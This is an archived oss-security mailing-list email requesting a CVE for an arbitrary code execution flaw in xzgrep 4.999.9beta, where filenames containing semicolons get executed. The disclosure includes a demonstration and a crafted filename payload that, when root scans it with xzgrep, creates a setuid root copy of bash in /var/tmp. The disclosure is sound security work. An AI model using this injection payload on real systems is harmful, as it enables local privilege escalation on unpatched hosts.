X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2255" "Monday" "18" "May" "2015" "13:16:33" "+0200" "Bart Dopheide" "dopheide@fmf.nl" "<20150518111633.GG32306@fmf.nl>" "60" "[oss-security] CVE request: xzgrep 4.999.9beta arbitrary code execution vulnerability" nil nil nil "5" "2015051811:16:33" "[oss-security] CVE request: xzgrep 4.999.9beta arbitrary code execution vulnerability" (number mark "        dopheide@fmf May 18   60/2255  " thread-indent "\"[oss-security] CVE request: xzgrep 4.999.9beta arbitrary code execution vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19535 invoked by uid 550); 18 May 2015 11:19:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 17792 invoked from network); 18 May 2015 11:16:45 -0000
Message-ID: <20150518111633.GG32306@fmf.nl>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="QWpDgw58+k1mSFBj"
Content-Disposition: inline
User-Agent: Mutt/1.5.21 (2010-09-15)
Date: Mon, 18 May 2015 13:16:33 +0200
From: Bart Dopheide <dopheide@fmf.nl>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: xzgrep 4.999.9beta arbitrary code execution
 vulnerability
To: oss-security@lists.openwall.com

--QWpDgw58+k1mSFBj
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

I discovered a bug in xzgrep 4.999.9beta. Please assign a CVE for this=20
vulnerability.

* Affected versions: 4.999.9beta
* Fixed versions: 5.0.0 and up, 5.2.0 and up
* Description:

xzgrep 4.999.9beta processes filenames containing a semicolon=20
incorrectly, which allows for arbitrary code execution as the local user=20
running xzgrep.

Demonstration of the vulnerability:
  sh-4.1$ touch /tmp/semi\;colon
  sh-4.1$ xzgrep anystring /tmp/semi\;colon=20
  xz: /tmp/semi: No such file or directory
  /usr/bin/xzgrep: line 199: colon: command not found
  sh-4.1$=20
xzgrep tries extract/grep /tmp/semi and tries to execute "colon", which=20
is obviously not wanted.

With a specially crafted filename and three ounces of social=20
engineering, a local root exploit is possible. For example:
  sh-4.1$ touch '/var/tmp/;echo -e "cp -p \0057bin\0057bash \0057var\0057tm=
p\0057\nchmod u+s \0057var\0057tmp\0057bash" >zzz;sh zzz;rm -f zzz'
  sh-4.1# find /var/tmp -type f -exec xzgrep anystring {} \+
A suid root /var/tmp/bash should be the result.

I checked RHEL 6, CentOS 6: they run 4.999.9beta and they are vulnerable.

--
Bart Dopheide

--QWpDgw58+k1mSFBj
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)

iQIcBAEBAgAGBQJVWcoRAAoJEOaIG//IiZ6rZHEP/ie1Swc6Hu7mMOfxT8JQyBYu
HBTw/ie0VvGW/BFrcpgZuvTz7IQnLwE2B7AKEd1cL99UJYyctIIKnDaJkGfM3AaI
IDGsxUv2QZpt09JedTvdK1xMgCtUk83k2dSCiIkRgAwF+n48YaGf83QgiH4f70Kk
x4nMMri4epYgTACDajdoCONFmiEN9qedRWhvD5ZCl2W5UFUGHZPQZcr+sLUbLitp
Ds394GCl39fbHl00+QIIy+4FdvuEctm3cL9vIiQhZbSCpzCtVuK7c8iXeyAnI4o8
f4rgcStV/jHX/7FWz1Dehsp62q/MtvZ7UYAfIgxIFpo+57stvRhEX2UXAH42adey
MmVuj1HhgSINlLEgI2KMKBnQCsJBbqozT4MSVg0K6YAz15dTjC//IUMOlfoi0D1w
EXAo50htM09pua7VblHZI0evo1gaSxTZCGNp1mcjqL+PRzJs6AZttgCgYo21aUOz
g3K5YM2IFMX81L6zGRGszNzO2f9wGf8nBt61QyI0WFHaoCU6IgBPWhQoCmH/ju0L
meM4u1OqWrHtRoMZ4E5Z/e5A9DScpkahhOTgTnyBnBMaFHF9QobeQ0P/sC1MawsG
9HrbTRBsjrwppmIDpAOId8i88FZRdOi4aKZShwLUp/7opGwROlX3wG6woLhtHDIT
Kvh2XmxdhuPAO+Na/oAC
=r40C
-----END PGP SIGNATURE-----

--QWpDgw58+k1mSFBj--
